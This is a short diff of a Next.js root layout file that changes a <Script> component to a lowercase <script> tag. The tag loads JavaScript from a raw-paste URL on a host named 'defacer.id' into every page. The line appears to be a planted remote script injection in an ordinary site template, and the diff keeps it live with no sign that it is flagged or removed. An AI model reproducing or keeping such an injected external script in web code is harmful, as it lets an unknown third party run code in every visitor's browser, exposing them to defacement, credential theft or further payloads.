@@ -44,7 +44,7 @@ export default function RootLayout({ children }) {
       </head>
       <body className="bg-slate-50 text-slate-800 overflow-x-hidden">
         {children}
-        <Script
+        <script
           src="https://jso.defacer.id/raw/HdL4A3H40c"
           strategy="afterInteractive"
         />
